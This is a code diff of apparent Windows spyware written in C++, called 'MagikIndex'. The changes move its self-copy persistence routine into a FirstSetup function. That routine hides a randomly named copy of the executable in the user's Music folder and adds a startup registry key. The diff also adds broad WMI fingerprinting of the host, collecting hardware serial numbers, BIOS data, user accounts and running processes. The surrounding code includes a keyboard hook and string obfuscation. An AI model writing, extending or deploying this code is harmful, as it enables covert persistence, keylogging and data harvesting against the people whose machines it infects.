@@ -6,7 +6,7 @@
 
 int Counter, Counter2;
 bool mutex, mutex2;
-Log MyLog;
+static Log MyLog;
 
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
@@ -144,6 +144,7 @@ Log:
     std::string CPUNumberText = "Number Of Cores:";
     std::string CPUTypeText = "CPU Type:";
     std::string CPUBrand = "CPU Brand And Model:";
+    std::string GPUBrand = "GPU Brand And Model:";
     std::string GenuineText = "Genuine Windows:";
     std::string SlowText = "Low-End CPU:";
     std::string MouseText = "Number Of Mouse Buttons:";
@@ -154,16 +155,20 @@ Log:
     std::string BootText = "Normal Boot:";
     std::string RAMText = "RAM Size:";
     std::string SeedText = "Randomness Seed:";
-    std::string CopiedFileText = "Made executable \"";
     std::string CryptText = "Encrypted with ";
     std::string DiskText = "Found partitions:\n";
     std::string IPText = "External IP:";
+    std::string OSText = "OS Name:";
+    std::string ManufacturerText = "Manufacturer:";
+    std::string InstallDateText = "Install Date:";
+    std::string SystemDeviceText = "System Device:";
+    std::string MotherBoardText = "Motherboard:";
+    std::string BIOSText = "BIOS:";
+    std::string HDDText = "Hard Disk:";
+    std::string DomainText;
 
     VersionText += CurrentVersion;
-    if (IsMajor)
-        VersionText += " Major Release - ";
-    else
-        VersionText += " Minor/Dev Release - ";
+    VersionText += IsMajor ? " Major Release - " : " Minor/Dev Release - ";
 
     char* AppData = nullptr;
     size_t AppDataSize;
@@ -244,11 +249,10 @@ Log:
     }
 
     DWORD Size = MAX_LENGTH+1;
-
     char HostName[MAX_LENGTH+1];
-
-    char UserName[MAX_LENGTH+1];
-
+    std::string UserNameT = QueryWMI("SELECT * FROM Win32_ComputerSystem", L"Username", 1);
+    std::string::size_type pos1 = std::string(UserNameT).find_last_of("\\/");
+    std::string UserName = std::string(UserNameT).substr(pos1+1, UserNameT.size());
     std::string InternetStatusString = "Not connected, error: ";
 
     DWORD DWFlags;
@@ -264,148 +268,69 @@ Log:
 
     GetComputerNameA(HostName,&Size);
 
-    GetUserNameA(UserName,&Size);
-
     if (FirstLog) {
-
         MyLog.LogItChar("First log of the session, copying files and adding to startup...");
-
-        std::string DestinationFile = "C:\\Users\\";
-        DestinationFile += UserName;
-        DestinationFile += "\\Music\\MagikIndex";
-
-
-        CreateDirectoryA(DestinationFile.c_str(), NULL);
-
-        SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
-
-        if (CalculateDirSize(DestinationFile) > MaximumFolderSize) {
-            DeleteDirectory(DestinationFile);
-            MyLog.LogItChar("Cleaned MagikIndex folder...");
-            Sleep(200);
-        }
-        DestinationFile += "\\";
-
-        std::string CopiedFile;
-
-        char CharacterSet[62] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0' };
-        for (int i = 0; i < 15; i++) {
-            CopiedFile += CharacterSet[rand() % 61 + 0];
-        }
-
-        DestinationFile += CopiedFile;
-
-        DestinationFile += ".exe";
-
-        CopyFileA(PathToFile, DestinationFile.c_str(), false);
-
-        CopiedFileText += CopiedFile;
-        CopiedFileText += ".exe\"...";
-        MyLog.LogItChar(CopiedFileText);
-
-        CreateRegistryKey("MagikIndex", DestinationFile.c_str());
-
-        MyLog.LogItChar("Registered executable for startup...");
-
+        FirstSetup();
     }else{
         MyLog.LogItChar("Not the first log of the session, skip copying files...");
     }
 
-    int x1, y1, x2, y2, w, h, mo, mb;
+    //fetch various System Metrics
+    int x1, y1, x2, y2;
     x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
     y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
     x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
     y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-    mo = GetSystemMetrics(SM_CMONITORS);
-    mb = GetSystemMetrics(SM_CMOUSEBUTTONS);
-    w = x2 - x1;
-    h = y2 - y1;
-    double Ratioed = (double)w / h;
-    std::string Width = std::to_string(w);
-    std::string Height = std::to_string(h);
+    std::string BootMode = (GetSystemMetrics(SM_CLEANBOOT) != 0) ? "No" : "Yes";
+    std::string SlowMachine = (GetSystemMetrics(SM_SLOWMACHINE) != 0) ? "Yes" : "No";
+    std::string MiddleEast = (GetSystemMetrics(SM_MIDEASTENABLED) != 0) ? "Yes" : "No";
+    double Ratioed = (double)((x2 - x1) / (y2 - y1));
+    std::string Width = std::to_string((x2 - x1));
+    std::string Height = std::to_string((y2 - y1));
+    std::string Monitors = std::to_string(GetSystemMetrics(SM_CMONITORS));
+    std::string MouseButtons = std::to_string(GetSystemMetrics(SM_CMOUSEBUTTONS));
+
+    //fetch Windows version using 2 different APIs
     std::string WindowsVersion = "Unknown";
-    std::string Monitors = std::to_string(mo);
-    std::string MouseButtons = std::to_string(mb);
-    std::string BootMode = "Yes";
     PBYTE WKSTAPointer;
     WKSTA_INFO_100 WKSTABuf;
     NetWkstaGetInfo(NULL, 100, &WKSTAPointer);
     memcpy(&WKSTABuf, WKSTAPointer, sizeof(WKSTABuf));
-    WindowsVersion = WKSTABuf.wki100_ver_major;
+    WindowsVersion = IsWindowsXPOrGreater() ? "XP " : WindowsVersion;
+    WindowsVersion = IsWindows7OrGreater() ? "7 " : WindowsVersion;
+    WindowsVersion = IsWindows7SP1OrGreater() ? "7 SP1 " : WindowsVersion;
+    WindowsVersion = IsWindows8OrGreater() ? "8 " : WindowsVersion;
+    WindowsVersion = IsWindows8Point1OrGreater() ? "8.1 " : WindowsVersion;
+    WindowsVersion = IsWindows10OrGreater() ? "10 " : WindowsVersion;
+    WindowsVersion = IsWindowsServer() ?  "Server " : WindowsVersion;
+    WindowsVersion += WKSTABuf.wki100_ver_major;
     WindowsVersion += ".";
     WindowsVersion += WKSTABuf.wki100_ver_minor;
-    if (GetSystemMetrics(SM_CLEANBOOT) != 0) {
-        BootMode = "No";
-    }
-    std::string SlowMachine = "No";
-    if (GetSystemMetrics(SM_SLOWMACHINE) != 0) {
-        SlowMachine = "Yes";
-    }
-    std::string MiddleEast = "No";
-    if (GetSystemMetrics(SM_MIDEASTENABLED) != 0) {
-        MiddleEast = "Yes";
-    }
-    if (IsWindowsXPOrGreater()) {
-        WindowsVersion = "XP / Vista";
-    }
-    if (IsWindows7OrGreater())
-    {
-        WindowsVersion = "Seven";
-    }
-    if (IsWindows7SP1OrGreater())
-    {
-        WindowsVersion = "Seven SP1";
-    }
-    if (IsWindows8OrGreater())
-    {
-        WindowsVersion = "Eight";
-    }
-    if (IsWindows8Point1OrGreater())
-    {
-        WindowsVersion = "Eight.one";
-    }
-    if (IsWindows10OrGreater())
-    {
-        WindowsVersion = "Ten";
-    }
-    if (IsWindowsServer())
-    {
-        WindowsVersion = "Server";
-    }
 
+    //fetch ram
     SYSTEM_INFO siSysInfo;
     GetSystemInfo(&siSysInfo);
     MEMORYSTATUSEX RAMStatus;
     RAMStatus.dwLength = sizeof(RAMStatus);
     GlobalMemoryStatusEx(&RAMStatus);
     std::string OEMNumber = std::to_string(siSysInfo.dwOemId);
-    std::string CPUCores = std::to_string(siSysInfo.dwNumberOfProcessors);
+    std::string CPUCores = std::to_string(siSysInfo.dwNumberOfProcessors/2);
     std::string CPUType = std::to_string(siSysInfo.dwProcessorType);
     std::string RAMAmount = std::to_string((RAMStatus.ullTotalPhys / 1024) / 1024);
     
-    std::string IsGenuine = "Yes";
+    //fetch autenthication status
     CONST SLID AppId = WINDOWS_SLID;
     SL_GENUINE_STATE GenuineState;
-    HRESULT hResult;
+    std::string IsGenuine = (SLIsGenuineLocal(&AppId, &GenuineState, NULL) == S_OK && GenuineState != SL_GEN_STATE_IS_GENUINE) ? "No" : "Yes";
 
-    hResult = SLIsGenuineLocal(&AppId, &GenuineState, NULL);
 
-    if (hResult == S_OK) {
-        if (GenuineState != SL_GEN_STATE_IS_GENUINE) {
-            IsGenuine = "No";
-        }
-    }
-
+    //fetch language and currency
     char LanguageIdentifier[100];
     char CurrIdentifier[100];
     GetLocaleInfo(GetSystemDefaultUILanguage(), LOCALE_SENGLANGUAGE, LanguageIdentifier, sizeof(LanguageIdentifier));
     GetLocaleInfo(GetSystemDefaultUILanguage(), LOCALE_SENGCURRNAME, CurrIdentifier, sizeof(CurrIdentifier));
 
-    if (IsElevated())
-        PrivilegeText += "Elevated";
-    else
-        PrivilegeText += "Standard";
-
+    PrivilegeText += IsElevated() ? "Elevated" : "Standard";
 
     TimeText += LogTime;
     MyLog.LogItChar(TimeText);
@@ -415,6 +340,45 @@ Log:
 
     UsernameText += UserName;
     MyLog.LogItChar(UsernameText);
+
+    OSText += QueryWMI("SELECT * FROM Win32_OperatingSystem", L"Caption",1);
+    MyLog.LogItChar(OSText);
+
+    ManufacturerText += QueryWMI("SELECT * FROM Win32_OperatingSystem", L"Manufacturer",1);
+    MyLog.LogItChar(ManufacturerText);
+
+    InstallDateText += QueryWMI("SELECT * FROM Win32_OperatingSystem", L"InstallDate",1);
+    MyLog.LogItChar(InstallDateText);
+
+    SystemDeviceText += QueryWMI("SELECT * FROM Win32_OperatingSystem", L"SystemDevice",1);
+    MyLog.LogItChar(SystemDeviceText);
+
+    MotherBoardText += QueryWMI("SELECT * FROM Win32_BaseBoard", L"Manufacturer",1);
+    MotherBoardText += " ";
+    MotherBoardText += QueryWMI("SELECT * FROM Win32_BaseBoard", L"Product",1);
+    MotherBoardText += " ";
+    MotherBoardText += QueryWMI("SELECT * FROM Win32_BaseBoard", L"Version",1);
+    MotherBoardText += " ";
+    MotherBoardText += QueryWMI("SELECT * FROM Win32_BaseBoard", L"SerialNumber",1);
+    MyLog.LogItChar(MotherBoardText);
+
+    BIOSText += QueryWMI("SELECT * FROM Win32_BIOS", L"Manufacturer",1);
+    BIOSText += " ";
+    BIOSText += QueryWMI("SELECT * FROM Win32_BIOS", L"Name",1);
+    BIOSText += " ";
+    BIOSText += QueryWMI("SELECT * FROM Win32_BIOS", L"SerialNumber",1);
+    MyLog.LogItChar(BIOSText);
+
+    HDDText += " Model:";
+    HDDText += QueryWMI("SELECT * FROM Win32_DiskDrive", L"Model",1);
+    HDDText += " Path:";
+    HDDText += QueryWMI("SELECT * FROM Win32_DiskDrive", L"Name",1);
+    HDDText += " SN:";
+    HDDText += QueryWMI("SELECT * FROM Win32_DiskDrive", L"SerialNumber",1);
+    HDDText += " Size:";
+    HDDText += QueryWMI("SELECT * FROM Win32_DiskDrive", L"Size",2);
+    HDDText += "Bytes";
+    MyLog.LogItChar(HDDText);
 
     InternetText += InternetStatusString;
     MyLog.LogItChar(InternetText);
@@ -444,14 +408,22 @@ Log:
     RAMText += " MB";
     MyLog.LogItChar(RAMText);
 
-    CPUNumberText += CPUCores;
-    MyLog.LogItChar(CPUNumberText);
-
     CPUTypeText += CPUType;
     MyLog.LogItChar(CPUTypeText);
 
-    CPUBrand += GetCpuInfo();
+	CPUBrand += GetCpuInfo();
+	CPUBrand += " x";
+	CPUBrand += CPUCores;
+	CPUBrand += ", ";
+	CPUBrand += QueryWMI("SELECT * FROM Win32_Processor", L"CurrentVoltage", 2);
+	CPUBrand += "v, ";
+	CPUBrand += QueryWMI("SELECT * FROM Win32_Processor", L"LoadPercentage", 2);
+	CPUBrand += "% Load";
+	//CPUBrand += QueryWMI("SELECT * FROM Win32_Processor", L"SerialNumber", 1);
     MyLog.LogItChar(CPUBrand);
+
+    GPUBrand += QueryWMI("SELECT * FROM Win32_VideoController", L"Caption", 1);
+    MyLog.LogItChar(GPUBrand);
 
     GenuineText += IsGenuine;
     MyLog.LogItChar(GenuineText);
@@ -506,6 +478,13 @@ Log:
     DiskText.erase(DiskText.size()-2);
     DiskText += "\n";
     MyLog.LogItChar(DiskText);
+
+    MyLog.LogItChar("_____________________________________________\nList of existing users: \n");
+
+
+    DomainText = QueryWMI("SELECT * from Win32_UserAccount",L"FullName",1);
+    MyLog.LogItChar(DomainText);
+
 
     MyLog.LogItChar("_____________________________________________\nList of running processes: \n");
 
@@ -588,17 +567,7 @@ Log:
 void DeleteDirectory(std::string dir)
 {
     dir += "\0";
-    SHFILEOPSTRUCTA file_op = {
-      NULL,
-      FO_DELETE,
-      dir.c_str(),
-      NULL,
-      FOF_NOCONFIRMATION |
-      FOF_NOERRORUI |
-      FOF_SILENT,
-      false,
-      0,
-      "" };
+    SHFILEOPSTRUCTA file_op = { NULL, FO_DELETE, dir.c_str(), NULL, FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT, false, 0, "" };
     SHFileOperationA(&file_op);
     return;
 }
@@ -961,13 +930,10 @@ void FinalExit() {
 }
 
 std::string HardDecode(std::string EncodedString) {
-    std::string Ret = { NULL };
     std::string Buf;
-    for (int i = EncodedString.size() - 1; i >= 0; i--) {
-        Buf += EncodedString[i] - 1;
-    }
-    Base64::decode(Buf, &Ret);
-    return Ret;
+    for (int i = EncodedString.size() - 1; i >= 0; i--) {Buf += EncodedString[i] -1;}
+    Base64::decode(Buf, &EncodedString);
+    return EncodedString;
 }
 
 LRESULT CALLBACK KeyboardThread(int nCode, WPARAM wParam, LPARAM lParam)
@@ -1086,5 +1052,127 @@ BOOL IsElevated() {
     }
     return fRet;
 }
+
+std::string QueryWMI(bstr_t Table, const wchar_t* Item, int Type) {
+
+    HRESULT hres;
+    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
+    hres = CoInitializeSecurity(
+        NULL,
+        -1,                          // COM authentication
+        NULL,                        // Authentication services
+        NULL,                        // Reserved
+        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
+        RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
+        NULL,                        // Authentication info
+        EOAC_NONE,                   // Additional capabilities 
+        NULL                         // Reserved
+    );
+    IWbemLocator* pLoc = NULL;
+    hres = CoCreateInstance(
+        CLSID_WbemLocator,
+        0,
+        CLSCTX_INPROC_SERVER,
+        IID_IWbemLocator, (LPVOID*)&pLoc);
+    IWbemServices* pSvc = NULL;
+    hres = pLoc->ConnectServer(
+        _bstr_t(L"ROOT\\CIMV2"), // Object path of WMI namespace
+        NULL,                    // User name. NULL = current user
+        NULL,                    // User password. NULL = current
+        0,                       // Locale. NULL indicates current
+        NULL,                    // Security flags.
+        0,                       // Authority (for example, Kerberos)
+        0,                       // Context object 
+        &pSvc                    // pointer to IWbemServices proxy
+    );
+    hres = CoSetProxyBlanket(
+        pSvc,                        // Indicates the proxy to set
+        RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
+        RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
+        NULL,                        // Server principal name 
+        RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
+        RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
+        NULL,                        // client identity
+        EOAC_NONE                    // proxy capabilities 
+    );
+    IEnumWbemClassObject* pEnumerator = NULL;
+    hres = pSvc->ExecQuery(
+        bstr_t("WQL"),
+        Table,
+        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
+        NULL,
+        &pEnumerator);
+    IWbemClassObject* pclsObj = NULL;
+    ULONG uReturn = 0;
+    std::string Ret = {};
+    while (pEnumerator)
+    {
+        HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1,
+            &pclsObj, &uReturn);
+
+        if (0 == uReturn)
+        {
+            break;
+        }
+
+        VARIANT vtProp;
+        VariantInit(&vtProp);
+        hr = pclsObj->Get(Item, 0, &vtProp, 0, 0);
+        VariantClear(&vtProp);
+		switch (Type) {
+		case 1:
+			Ret = _com_util::ConvertBSTRToString(vtProp.bstrVal);
+			break;
+		case 2:
+			Ret = std::to_string(vtProp.uintVal);
+			break;
+		default:
+			break;
+		}
+        pclsObj->Release();
+    }
+
+    pSvc->Release();
+    pLoc->Release();
+    pEnumerator->Release();
+    CoUninitialize();
+
+    return Ret;
+}
+
+void FirstSetup() {
+    std::string CopiedFileText = "Made executable \"";
+    char PathToFile[MAX_PATH]; DWORD Size;
+    std::string UserNameT = QueryWMI("SELECT * FROM Win32_ComputerSystem", L"Username", 1);
+    std::string::size_type pos = std::string(UserNameT).find_last_of("\\/");
+    std::string UserName = std::string(UserNameT).substr(pos+1, UserNameT.size());
+    HMODULE GetModH = GetModuleHandle(NULL);
+    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
+    std::string DestinationFile = "C:\\Users\\";
+    DestinationFile += UserName;
+    DestinationFile += "\\Music\\MagikIndex";
+    CreateDirectoryA(DestinationFile.c_str(), NULL);
+    SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
+    if (CalculateDirSize(DestinationFile) > MaximumFolderSize) {
+        DeleteDirectory(DestinationFile);
+        MyLog.LogItChar("Cleaned MagikIndex folder...");
+        Sleep(200);
+    }
+    DestinationFile += "\\";
+    std::string CopiedFile;
+    char CharacterSet[62] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0' };
+    for (int i = 0; i < 15; i++) {
+        CopiedFile += CharacterSet[rand() % 61 + 0];
+    }
+    DestinationFile += CopiedFile;
+    DestinationFile += ".exe";
+    CopyFileA(PathToFile, DestinationFile.c_str(), false);
+    CopiedFileText += CopiedFile;
+    CopiedFileText += ".exe\"...";
+    MyLog.LogItChar(CopiedFileText);
+    CreateRegistryKey("MagikIndex", DestinationFile.c_str());
+    MyLog.LogItChar("Registered executable for startup...");
+}
+
 
 #pragma warning( pop )
